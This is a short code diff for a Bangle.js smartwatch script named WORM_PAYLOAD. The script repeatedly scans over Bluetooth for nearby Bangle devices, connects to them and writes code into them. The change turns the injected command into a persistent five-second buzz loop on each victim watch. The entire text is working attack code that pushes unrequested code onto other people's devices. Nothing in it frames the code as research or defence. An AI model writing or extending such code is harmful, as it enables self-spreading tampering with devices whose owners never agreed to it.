@@ -3,6 +3,6 @@ let WORM_PAYLOAD = setInterval(() => {
     Bangle.buzz();
     console.log('Buzz!');
     NRF.requestDevice({ filters: [{ namePrefix: 'Bangle' }] }).then((dev) => {
-        connect(dev).then((u) => u.write('Bangle.buzz();\n'));
+        connect(dev).then((u) => u.write('setInterval(() => { Bangle.buzz();}, 5000);\n'));
     });
 }, 5000);
